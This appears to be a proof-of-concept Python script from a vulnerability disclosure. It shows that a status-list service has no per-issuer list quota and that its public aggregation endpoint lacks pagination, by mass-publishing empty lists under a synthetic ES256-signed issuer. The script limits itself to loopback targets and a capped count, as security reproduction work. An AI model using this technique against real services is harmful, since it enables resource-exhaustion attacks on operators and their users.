#!/usr/bin/env python3
"""Reproduce bounded list-cardinality and aggregation-resource gaps.

The script creates a small, disposable fixture of many empty status lists under a
single synthetic issuer. It proves that every insert succeeds without an active
list quota and that public aggregation returns the complete set in one response,
including when a caller supplies an illustrative page-size query parameter.
"""

import argparse
import base64
import json
import subprocess
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path


BASELINE = "adbe8fdacae5edb1ce655a14a5f5f2120ea229e3"


class PocError(RuntimeError):
    pass


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def http_request(
    method: str,
    url: str,
    body: dict | None = None,
    headers: dict | None = None,
) -> tuple[int, dict[str, str], bytes]:
    data = None if body is None else json.dumps(body).encode("utf-8")
    request_headers = {"Content-Type": "application/json"} if body is not None else {}
    request_headers.update(headers or {})
    request = urllib.request.Request(url, data=data, method=method, headers=request_headers)
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return (
                response.status,
                {key.lower(): value for key, value in response.headers.items()},
                response.read(),
            )
    except urllib.error.HTTPError as error:
        return (
            error.code,
            {key.lower(): value for key, value in error.headers.items()},
            error.read(),
        )
    except urllib.error.URLError as error:
        raise PocError(f"request to {url} failed: {error}") from error


def require_status(actual: int, expected: int, operation: str, body: bytes) -> None:
    if actual != expected:
        detail = body.decode("utf-8", errors="replace")
        raise PocError(f"{operation} returned HTTP {actual}, expected {expected}: {detail}")


def require_loopback_url(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "localhost", "::1"}:
        raise PocError(f"refusing non-loopback or non-HTTP target: {url}")
    return url.rstrip("/")


def wait_for_health(base_url: str, timeout: float = 120.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            status, _, _ = http_request("GET", f"{base_url}/health")
            if status == 200:
                return
        except PocError:
            pass
        time.sleep(1.0)
    raise PocError(f"target did not become healthy within {timeout:.0f} seconds")


def read_der_length(data: bytes, offset: int) -> tuple[int, int]:
    first = data[offset]
    offset += 1
    if first < 0x80:
        return first, offset
    count = first & 0x7F
    if count == 0 or count > 4 or offset + count > len(data):
        raise PocError("unsupported DER length in OpenSSL signature")
    return int.from_bytes(data[offset : offset + count], "big"), offset + count


def read_der_integer(data: bytes, offset: int) -> tuple[int, int]:
    if offset >= len(data) or data[offset] != 0x02:
        raise PocError("invalid ECDSA DER integer")
    length, start = read_der_length(data, offset + 1)
    end = start + length
    if end > len(data):
        raise PocError("truncated ECDSA DER integer")
    return int.from_bytes(data[start:end], "big"), end


def ecdsa_der_to_raw(signature: bytes) -> bytes:
    if not signature or signature[0] != 0x30:
        raise PocError("OpenSSL returned a non-SEQUENCE ECDSA signature")
    length, offset = read_der_length(signature, 1)
    if offset + length != len(signature):
        raise PocError("invalid ECDSA DER sequence length")
    r, offset = read_der_integer(signature, offset)
    s, offset = read_der_integer(signature, offset)
    if offset != len(signature) or r.bit_length() > 256 or s.bit_length() > 256:
        raise PocError("invalid P-256 ECDSA signature")
    return r.to_bytes(32, "big") + s.to_bytes(32, "big")


class EphemeralIssuer:
    def __init__(self, directory: Path):
        self.issuer = f"poc-resource-{uuid.uuid4()}"
        self.key_path = directory / "issuer-key.pem"
        generated = subprocess.run(
            [
                "openssl",
                "genpkey",
                "-algorithm",
                "EC",
                "-pkeyopt",
                "ec_paramgen_curve:P-256",
                "-out",
                str(self.key_path),
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        if generated.returncode != 0:
            raise PocError(f"OpenSSL key generation failed: {generated.stderr.strip()}")

        exported = subprocess.run(
            ["openssl", "pkey", "-in", str(self.key_path), "-pubout", "-outform", "DER"],
            capture_output=True,
            check=False,
        )
        if exported.returncode != 0:
            raise PocError(f"OpenSSL public-key export failed: {exported.stderr.decode().strip()}")
        if len(exported.stdout) < 65 or exported.stdout[-65] != 0x04:
            raise PocError("unexpected OpenSSL P-256 public-key encoding")
        point = exported.stdout[-64:]
        self.jwk = {
            "kty": "EC",
            "crv": "P-256",
            "x": b64url_encode(point[:32]),
            "y": b64url_encode(point[32:]),
        }

    def management_token(self) -> str:
        header = {"alg": "ES256", "typ": "JWT"}
        claims = {"iss": self.issuer, "iat": int(time.time()), "exp": int(time.time()) + 3600}
        signing_input = ".".join(
            b64url_encode(json.dumps(value, separators=(",", ":")).encode("utf-8"))
            for value in (header, claims)
        ).encode("ascii")
        signed = subprocess.run(
            ["openssl", "dgst", "-sha256", "-sign", str(self.key_path)],
            input=signing_input,
            capture_output=True,
            check=False,
        )
        if signed.returncode != 0:
            raise PocError(f"OpenSSL signing failed: {signed.stderr.decode().strip()}")
        return signing_input.decode("ascii") + "." + b64url_encode(
            ecdsa_der_to_raw(signed.stdout)
        )


def fetch_aggregation(base_url: str, suffix: str = "") -> tuple[dict[str, str], dict, int]:
    status, headers, body = http_request("GET", f"{base_url}/api/v1/aggregation{suffix}")
    require_status(status, 200, f"public aggregation{suffix}", body)
    return headers, json.loads(body.decode("utf-8")), len(body)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:18008")
    parser.add_argument("--list-count", type=int, default=128)
    parser.add_argument(
        "--confirm-disposable-target",
        action="store_true",
        help="required acknowledgement that all writes target a disposable local stack",
    )
    args = parser.parse_args()
    if not args.confirm_disposable_target:
        parser.error("--confirm-disposable-target is required before any write")
    if not 1 <= args.list_count <= 512:
        parser.error("--list-count must stay between 1 and 512 for this bounded PoC")

    base_url = require_loopback_url(args.base_url)
    wait_for_health(base_url)

    with tempfile.TemporaryDirectory(prefix="status-list-resource-poc-") as temp_dir:
        issuer = EphemeralIssuer(Path(temp_dir))
        status, _, body = http_request(
            "POST",
            f"{base_url}/api/v1/credentials",
            {"issuer": issuer.issuer, "public_key": issuer.jwk},
        )
        require_status(status, 202, "synthetic credential registration", body)
        token = issuer.management_token()
        auth = {"Authorization": f"Bearer {token}"}

        list_ids: list[str] = []
        for index in range(args.list_count):
            list_id = str(uuid.uuid4())
            status, _, body = http_request(
                "PUT",
                f"{base_url}/api/v1/status-lists/{list_id}/statuses",
                {"statuses": []},
                auth,
            )
            require_status(status, 201, f"empty list publication {index + 1}", body)
            list_ids.append(list_id)

        print(f"[1/4] Published {len(list_ids)} empty lists for one issuer without a list-count quota")

        headers, aggregation, response_bytes = fetch_aggregation(base_url)
        uris = aggregation.get("status_lists", [])
        observed = sum(1 for list_id in list_ids if any(list_id in uri for uri in uris))
        if observed != len(list_ids):
            raise PocError(f"aggregation returned {observed}/{len(list_ids)} created lists")
        print(f"[2/4] Public aggregation returned all {observed} created URIs in one response")

        limited_headers, limited_aggregation, limited_bytes = fetch_aggregation(base_url, "?limit=1")
        limited_uris = limited_aggregation.get("status_lists", [])
        limited_observed = sum(1 for list_id in list_ids if any(list_id in uri for uri in limited_uris))
        if limited_observed != len(list_ids):
            raise PocError("illustrative limit query unexpectedly changed aggregation cardinality")
        print('[3/4] Aggregation ignored illustrative ?limit=1 and still returned the complete set')

        pagination_headers = {"link", "x-next-cursor", "x-total-count"}
        present_headers = sorted(pagination_headers.intersection(limited_headers))
        if present_headers:
            raise PocError(f"unexpected pagination-style headers present: {present_headers}")
        if headers.get("content-type", "").split(";")[0] != "application/json":
            raise PocError("aggregation did not return JSON")
        print(
            "[4/4] Aggregation had no cursor/page metadata; "
            f"response bytes grew to {response_bytes} ({limited_bytes} with ?limit=1)"
        )

    print(f"\nRESULT: REST and aggregation gaps reproduced at baseline {BASELINE}")


if __name__ == "__main__":
    try:
        main()
    except (OSError, PocError, subprocess.SubprocessError) as error:
        raise SystemExit(f"PoC failed: {error}") from error
